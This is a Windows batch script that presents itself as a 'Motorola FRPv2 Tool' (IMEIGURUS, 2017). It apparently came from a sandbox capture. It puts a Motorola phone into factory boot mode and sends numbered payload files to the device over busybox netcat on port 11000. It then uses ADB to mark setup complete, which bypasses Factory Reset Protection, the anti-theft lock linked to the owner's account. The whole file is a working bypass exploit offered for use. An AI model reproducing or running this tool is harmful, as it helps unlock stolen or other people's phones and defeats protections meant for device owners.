@echo off
set ztmp=C:\Users\vagrant\AppData\Local\Temp\xtmp
set MYFILES=C:\Users\vagrant\AppData\Local\Temp\afolder
set bfcec=tmp30159.exe
set cmdline=
SHIFT /0
@ECHO OFF
set TOOLS=%MYFILES%
::set TOOLS=%~dp0
set ADB_EXE=%TOOLS%\adb.exe
set BUSYBOX_EXE=%TOOLS%\busybox.exe
set FASTBOOT_EXE=%TOOLS%\fastboot.exe
set IP=192.168.137.1

GOTO :MAIN

:CHECKIP
ping -n 1 %IP% | find "TTL=" >NUL 2>&1
if errorlevel 1 (
	ping 127.0.0.1 -n 5 1>NUL 2>&1
	GOTO CHECKIP
)	
IF /I "%STEP%"=="1" GOTO FOUNDIP1
IF /I "%STEP%"=="2" GOTO FOUNDIP2
IF /I "%STEP%"=="3" GOTO FOUNDIP3

:CHECKPM
SET pmrunning=N
%ADB_EXE% wait-for-device
FOR /F "tokens=*" %%i in ('%ADB_EXE% shell ps^|FIND /I "android.process.acore"') do SET pmrunning=Y
IF /I "%pmrunning%"=="N" (
	ping -n 3 127.0.0.1 >NUL
	GOTO :CHECKPM
)
GOTO :FOUNDPM

:MAIN
CLS
ECHO.
ECHO.
ECHO.
ECHO.
ECHO.
ECHO.
ECHO.
ECHO.
ECHO.
ECHO.
ECHO                                 IMEIGURUS (c) 2017
ECHO                                Motorola FRPv2 Tool
ECHO                                   by chavonbravo
ECHO.
ECHO                  (Device should be asking to verify email account)
ECHO.
ECHO.
ECHO.
ECHO.
ECHO.
ECHO.
ECHO.
ECHO.
ECHO.
ping 127.0.0.1 -n 5 1>NUL 2>&1
cls
ECHO.
ECHO                  Put Motorola device in fastboot/bootloader mode
%FASTBOOT_EXE% oem config bootmode factory >NUL 2>&1
%FASTBOOT_EXE% reboot >NUL 2>&1
ECHO.
ECHO                             Waiting for device...
SET STEP=1
GOTO CHECKIP
:FOUNDIP1
ECHO.
ECHO                                    Found!
ECHO.
ECHO                        Sending payload and rebooting
%BUSYBOX_EXE% cat %TOOLS%\1 | %BUSYBOX_EXE% nc 192.168.137.2:11000 >NUL
%BUSYBOX_EXE% cat %TOOLS%\2 | %BUSYBOX_EXE% nc 192.168.137.2:11000 >NUL
%BUSYBOX_EXE% cat %TOOLS%\3 | %BUSYBOX_EXE% nc 192.168.137.2:11000 >NUL
ping 127.0.0.1 -n 5 1>NUL 2>&1
ECHO.
ECHO                             Waiting for device...
SET STEP=2
GOTO CHECKIP
:FOUNDIP2
ECHO.
ECHO                                    Found!
ECHO.
ECHO                               Sending payload
%BUSYBOX_EXE% cat %TOOLS%\4 | %BUSYBOX_EXE% nc 192.168.137.2:11000 >NUL
ping 127.0.0.1 -n 2 1>NUL 2>&1
ECHO.
ECHO                             Waiting for device...
SET STEP=3
GOTO CHECKIP
:FOUNDIP3
ECHO.
ECHO                                    Found!
ECHO.
ECHO                        Sending payload and rebooting
%BUSYBOX_EXE% cat %TOOLS%\5 | %BUSYBOX_EXE% nc 192.168.137.2:11000 >NUL
%BUSYBOX_EXE% cat %TOOLS%\3 | %BUSYBOX_EXE% nc 192.168.137.2:11000 >NUL
ping 127.0.0.1 -n 5 1>NUL 2>&1
ECHO.
ECHO                  Waiting for device and Allow USB Debug...
%ADB_EXE% kill-server >NUL 2>&1
%ADB_EXE% wait-for-device >NUL 2>&1
ECHO.
ECHO                                    Found!
ECHO.
ECHO                               Bypassing FRP...
GOTO CHECKPM
:FOUNDPM
%ADB_EXE% shell settings put secure user_setup_complete 1 >NUL 2>&1
%ADB_EXE% shell sync >NUL 2>&1
ECHO.
ECHO                       Rebooting to fastboot/bootloader
%ADB_EXE% reboot bootloader >NUL 2>&1
%FASTBOOT_EXE% oem config bootmode "" >NUL 2>&1
%FASTBOOT_EXE% reboot >NUL 2>&1
ECHO.
ECHO                                   DONE!!!
%ADB_EXE% kill-server >NUL 2>&1
ping 127.0.0.1 -n 5 1>NUL 2>&1



